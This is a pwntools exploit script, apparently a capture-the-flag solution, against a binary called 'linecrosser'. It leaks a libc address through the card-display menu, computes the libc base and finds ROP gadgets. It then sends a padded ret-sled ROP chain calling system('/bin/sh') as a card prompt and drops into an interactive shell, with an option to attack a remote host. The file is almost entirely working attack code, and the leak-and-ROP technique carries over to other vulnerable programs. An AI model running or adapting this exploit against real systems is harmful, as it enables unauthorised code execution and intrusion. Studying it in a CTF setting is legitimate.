#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('linecrosser')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
brva 0x16BE
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create_card(card_choice: int, prompt: bytes, completion: int) -> None:
    io.sendline(b"2")
    io.sendlineafter(b"?", str(card_choice).encode())
    io.sendlineafter(b"prompt", prompt)
    io.sendlineafter(b"completions?", str(completion).encode())


def show_card(idx: int) -> int:
    io.sendline(b"3")
    io.sendlineafter(b"?", b"2")
    io.sendlineafter(b"?", str(idx).encode())
    io.recvuntil(b"Prompt (")
    data = int(io.recvline().split(b" ")[0])
    return data


def solve():

    ANSWER = 1
    PROMPT = 2
    SIZE = 0x400

    libc.address = show_card(30) - 0x22a5b0
    info("libc base: %#x", libc.address)

    rop = ROP(libc)
    POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
    RET = rop.find_gadget(["ret"])[0]
    SH = next(libc.search(b"/bin/sh\0"))
    SYSTEM = libc.sym["system"]

    chain = flat(
        [
            POP_RDI,
            SH,
            RET,
            SYSTEM
        ]
    )

    info("pop rdi: %#x", POP_RDI)
    info("sh: %#x", SH)
    info("ret: %#x", RET)
    info("system: %#x", SYSTEM)


    payload = p64(RET) * ((SIZE - len(chain)) // 8) + chain
    
    create_card(PROMPT, payload, 0)
    io.sendline(b"ls")
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

